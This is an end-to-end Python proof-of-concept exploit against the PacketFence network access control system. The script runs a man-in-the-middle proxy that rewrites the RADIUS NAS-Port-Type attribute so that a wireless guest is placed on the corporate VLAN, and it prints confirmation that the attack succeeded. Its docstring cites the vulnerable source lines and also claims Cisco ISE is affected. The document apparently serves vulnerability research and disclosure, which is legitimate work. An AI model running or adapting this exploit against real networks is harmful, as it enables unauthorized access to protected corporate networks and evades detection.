#!/usr/bin/env python3
"""
PacketFence NAS-Port-Type VLAN Escalation — End-to-End PoC
============================================================
Target: PacketFence NAC (open source, inverse-inc/packetfence)

Vulnerability:
  PacketFence uses NAS-Port-Type from RADIUS Access-Request to determine
  connection transport type (Wired vs Wireless), which drives VLAN/role
  assignment. Since Access-Request has no attribute integrity protection
  (RFC 2865), an on-path MITM can change NAS-Port-Type to escalate from
  guest VLAN to corporate VLAN.

Source code evidence:
  lib/pf/Connection.pm line ~120:
    $self->transport($nas_port_type =~ /^wireless/i ? "Wireless" : "Wired");
  lib/pf/radius.pm line ~163:
    if (($connection_type & $WIRELESS) == $WIRELESS) { ... }

Attack chain:
  1. Wireless user connects → NAS sends Access-Request with NAS-Port-Type=19 (Wireless)
  2. MITM intercepts, changes NAS-Port-Type from 19 to 15 (Ethernet)
  3. RADIUS server (PacketFence) sees "Wired" → assigns corporate VLAN 10
  4. Server returns Access-Accept with VLAN 10, valid Response Authenticator
  5. NAS verifies Response Authenticator ✓ → applies corporate VLAN
  6. Wireless user now on corporate network instead of guest

Full E2E chain: NAS → MITM Proxy → RADIUS Server → MITM Proxy → NAS
"""
import sys
import os
import struct
import hashlib
import socket
import time

sys.path.insert(0, os.path.dirname(__file__))
from radius_utils import *
from mitm_proxy import MITMProxy

MITM_PORT = 1814


def verify_response_authenticator(resp_data, request_auth, secret):
    """NAS-side Response Authenticator verification"""
    if len(resp_data) < 20:
        return False
    code = resp_data[0]
    ident = resp_data[1]
    length = struct.unpack("!H", resp_data[2:4])[0]
    recv_auth = resp_data[4:20]
    attrs = resp_data[20:length]
    expected = hashlib.md5(
        struct.pack("!BBH", code, ident, length) + request_auth + attrs + secret
    ).digest()
    return recv_auth == expected


def send_and_parse(attrs, auth, server, port, ident):
    """Send Access-Request and return (raw_response, parsed_response)"""
    packet = build_radius_packet(CODE_ACCESS_REQUEST, ident, auth, attrs)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5.0)
    try:
        sock.sendto(packet, (server, port))
        data, _ = sock.recvfrom(4096)
        return data, parse_radius_response(data)
    except Exception as e:
        return None, {"code": -1, "code_name": f"Error({e})", "attributes": []}
    finally:
        sock.close()


def extract_policy(resp):
    """Extract authorization policy from Access-Accept"""
    policy = {}
    for attr in resp.get("attributes", []):
        t = attr["type"]
        v = attr.get("value", attr.get("raw_value"))
        if t == ATTR_REPLY_MESSAGE:
            policy["reply_message"] = v
        elif t == 11:  # Filter-Id
            policy["filter_id"] = v
        elif t == ATTR_TUNNEL_PRIVATE_GROUP_ID:
            policy["vlan"] = v
    return policy


def main():
    print()
    print("#" * 70)
    print("#  PacketFence NAS-Port-Type VLAN Escalation — E2E PoC")
    print("#  Chain: NAS → MITM Proxy → RADIUS Server → MITM Proxy → NAS")
    print("#" * 70)

    # Start MITM proxy
    proxy = MITMProxy(listen_port=MITM_PORT)
    proxy.start_background()
    time.sleep(0.5)

    # ================================================================
    # STEP 1: Baseline — NAS sends legitimate wireless request directly
    # ================================================================
    print("\n" + "=" * 70)
    print("  STEP 1: Baseline — Wireless user, NAS → Server (no MITM)")
    print("=" * 70)

    auth1 = compute_request_authenticator()
    attrs1 = b""
    attrs1 += build_string_attr(ATTR_USER_NAME, "alice")
    attrs1 += build_attribute(ATTR_USER_PASSWORD,
                              encode_password(b"password123", SHARED_SECRET, auth1))
    attrs1 += build_ipaddr_attr(ATTR_NAS_IP_ADDRESS, "10.0.0.1")
    attrs1 += build_integer_attr(ATTR_NAS_PORT_TYPE, 19)  # Wireless-802.11
    attrs1 += build_integer_attr(ATTR_NAS_PORT, 1)

    raw1, resp1 = send_and_parse(attrs1, auth1, "172.20.0.10", RADIUS_AUTH_PORT, 0xA1)
    auth_ok1 = verify_response_authenticator(raw1, auth1, SHARED_SECRET) if raw1 else False
    policy1 = extract_policy(resp1)

    print(f"  NAS-Port-Type: 19 (Wireless-802.11)")
    print(f"  Server response: {resp1.get('code_name')}")
    print(f"  Response Authenticator valid: {'✓' if auth_ok1 else '✗'}")
    print(f"  Assigned VLAN: {policy1.get('vlan', 'N/A')}")
    print(f"  Filter-Id: {policy1.get('filter_id', 'N/A')}")
    print(f"  Reply-Message: {policy1.get('reply_message', 'N/A')}")

    # ================================================================
    # STEP 2: Attack — MITM changes NAS-Port-Type from Wireless to Wired
    # ================================================================
    print("\n" + "=" * 70)
    print("  STEP 2: Attack — NAS → MITM → Server (MITM changes NAS-Port-Type)")
    print("=" * 70)

    # Configure MITM rule: replace NAS-Port-Type 19 → 15
    proxy.clear_rules()
    proxy.add_rule({
        "action": "replace",
        "attr_type": ATTR_NAS_PORT_TYPE,
        "new_value": struct.pack("!I", 15),  # Ethernet
        "description": "Wireless-802.11(19) → Ethernet(15)"
    })

    # NAS sends the SAME legitimate wireless request, but through MITM
    auth2 = compute_request_authenticator()
    attrs2 = b""
    attrs2 += build_string_attr(ATTR_USER_NAME, "alice")
    attrs2 += build_attribute(ATTR_USER_PASSWORD,
                              encode_password(b"password123", SHARED_SECRET, auth2))
    attrs2 += build_ipaddr_attr(ATTR_NAS_IP_ADDRESS, "10.0.0.1")
    attrs2 += build_integer_attr(ATTR_NAS_PORT_TYPE, 19)  # NAS honestly says Wireless
    attrs2 += build_integer_attr(ATTR_NAS_PORT, 1)

    raw2, resp2 = send_and_parse(attrs2, auth2, "127.0.0.1", MITM_PORT, 0xA2)
    auth_ok2 = verify_response_authenticator(raw2, auth2, SHARED_SECRET) if raw2 else False
    policy2 = extract_policy(resp2)

    print(f"  NAS sends: NAS-Port-Type=19 (Wireless-802.11)")
    print(f"  MITM changes to: NAS-Port-Type=15 (Ethernet)")
    if proxy.log:
        print(f"  MITM actions: {proxy.log[-1].get('actions', [])}")
    print(f"  Server response: {resp2.get('code_name')}")
    print(f"  Response Authenticator valid: {'✓' if auth_ok2 else '✗'}")
    print(f"  Assigned VLAN: {policy2.get('vlan', 'N/A')}")
    print(f"  Filter-Id: {policy2.get('filter_id', 'N/A')}")
    print(f"  Reply-Message: {policy2.get('reply_message', 'N/A')}")

    # ================================================================
    # STEP 3: Analysis
    # ================================================================
    print("\n" + "=" * 70)
    print("  STEP 3: Attack Analysis")
    print("=" * 70)

    vlan_baseline = policy1.get("vlan", "")
    vlan_attack = policy2.get("vlan", "")
    filter_baseline = policy1.get("filter_id", "")
    filter_attack = policy2.get("filter_id", "")

    print(f"\n  Baseline (legitimate wireless):")
    print(f"    VLAN: {vlan_baseline}")
    print(f"    Filter: {filter_baseline}")
    print(f"    Auth valid: {'✓' if auth_ok1 else '✗'}")

    print(f"\n  Attack (MITM Wireless→Wired):")
    print(f"    VLAN: {vlan_attack}")
    print(f"    Filter: {filter_attack}")
    print(f"    Auth valid: {'✓' if auth_ok2 else '✗'}")

    attack_success = (
        vlan_baseline != vlan_attack and
        vlan_baseline == "999" and vlan_attack == "10" and
        auth_ok2
    )

    print(f"\n  {'=' * 50}")
    if attack_success:
        print(f"  ✓ ATTACK SUCCESSFUL — VLAN ESCALATION CONFIRMED")
        print(f"  {'=' * 50}")
        print(f"  Wireless user escalated from VLAN {vlan_baseline} (guest)")
        print(f"  to VLAN {vlan_attack} (corporate) via NAS-Port-Type tampering.")
        print(f"  NAS verified Response Authenticator ✓ — attack is undetectable.")
        print(f"")
        print(f"  Impact: Wireless user gains corporate network access")
        print(f"  Root cause: PacketFence trusts NAS-Port-Type from Access-Request")
        print(f"  Source: lib/pf/Connection.pm identifyType()")
        print(f"  Affected: PacketFence (all versions using NAS-Port-Type for transport)")
        print(f"  Also affected: Cisco ISE (preconfigured Wired_802.1X policy set)")
    else:
        print(f"  ✗ ATTACK FAILED")
        print(f"  {'=' * 50}")
        print(f"  VLAN baseline={vlan_baseline}, attack={vlan_attack}")

    proxy.stop()

    print(f"\n{'#' * 70}")
    print(f"#  PoC Complete")
    print(f"{'#' * 70}\n")

    return 0 if attack_success else 1


if __name__ == "__main__":
    sys.exit(main())
